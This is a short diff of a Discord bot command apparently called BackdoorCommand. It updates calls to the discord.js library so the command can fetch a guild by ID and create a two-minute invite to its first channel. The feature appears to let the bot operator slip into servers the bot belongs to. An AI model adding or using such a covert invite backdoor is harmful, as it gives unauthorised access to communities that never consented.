@@ -36,8 +36,8 @@ module.exports = class BackdoorCommand extends Command {
             }).catch(console.error)
 
         } else {
-            const getGuild = this.client.guilds.get(args.guild)
-            const toInv = getGuild.channels.first()
+            const getGuild = this.client.guilds.cache.get(guild)
+            const toInv = getGuild.channels.cache.first()
 
             const invite = toInv.createInvite({
                 maxAge: 120,
